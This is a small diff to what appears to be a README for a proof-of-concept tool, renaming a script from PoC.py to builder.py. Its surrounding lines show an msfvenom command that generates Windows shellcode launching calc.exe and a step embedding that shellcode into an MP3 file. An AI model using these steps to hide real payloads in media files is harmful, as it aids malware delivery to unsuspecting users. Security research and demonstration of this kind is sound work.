@@ -44,7 +44,7 @@ msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o shellcode.bin
 ### 2. Embed into MP3
 
 ```bash
-python3 PoC.py song.mp3 shellcode.bin
+python3 builder.py song.mp3 shellcode.bin
 ```
 
 Output → `song_with_shellcode.mp3`
